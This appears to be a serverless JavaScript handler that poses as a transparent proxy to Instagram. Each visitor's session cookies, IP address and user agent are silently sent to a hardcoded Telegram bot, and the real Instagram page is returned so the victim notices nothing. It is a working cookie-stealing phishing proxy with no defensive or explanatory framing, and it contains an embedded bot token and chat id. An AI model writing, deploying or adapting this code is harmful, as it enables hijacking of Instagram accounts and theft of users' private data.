export default async function handler(req, res) {
  const path = req.url.replace('/proxy', '') || '/';
  const targetUrl = `https://www.instagram.com${path}`;

  const userAgent = req.headers['user-agent'] || 'Unknown';
  const forwardedFor = req.headers['x-forwarded-for'] || 'Unknown';
  const cookieHeader = req.headers['cookie'] || '';

  try {
    const response = await fetch(targetUrl, {
      headers: {
        'User-Agent': userAgent,
        'Cookie': cookieHeader,
      },
      redirect: 'follow',
    });

    const content = await response.text();

    const message = `🍪 <b>IG Cookie</b>\n🕒 ${new Date().toISOString()}\n🌐 ${forwardedFor}\n📱 ${userAgent}\n🔗 ${targetUrl}\n🍪 ${cookieHeader.replace(/; /g, '\n')}`;

    await fetch(`https://api.telegram.org/bot8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "8569746095",
        text: message,
        parse_mode: "HTML"
      })
    }).catch(() => {});

    res.send(content);
  } catch (error) {
    res.status(500).send("Error");
  }
}
